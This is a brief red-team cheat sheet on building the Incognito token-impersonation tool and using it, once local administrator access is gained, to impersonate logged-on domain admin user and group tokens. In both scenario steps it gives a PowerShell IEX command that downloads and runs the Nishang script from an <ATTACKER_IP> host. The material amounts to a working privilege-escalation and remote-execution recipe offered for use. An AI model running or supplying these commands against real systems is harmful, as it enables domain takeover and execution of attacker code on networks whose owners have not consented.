# Building the `incognito.exe` binary
1. clone the ingonitor repository [here](https://github.com/FSecureLABS/incognito)
2. make sure you have visual studio installed with the C++ compile workload installed
3. open a developer's command prompt from the start menu
4. go to the project folder
5. run the `nmake` command
6. you should get the `incognito.exe` binary as an output

# Scenario: you have local administrator on a machine. And a domain admin is logged on
1. list user tokens `incognito.exe list_tokens -u` or group tokens `incognito.exe list_tokens -g`
2. impersonate any of the available **user** tokens and run a PowerShell command
```shell
incognito.exe execute LAB\Administrator "powershell IEX(New-Object Net.webClient).downloadString('http://<ATTACKER_IP>/nishang.ps1')"
```
3. impersonate any of the available **group** tokens and run a PowerShell command
```shell
incognito.exe execute "LAB\Domain Admins" "powershell IEX(New-Object Net.webClient).downloadString('http://<ATTACKER_IP>/nishang.ps1')"
```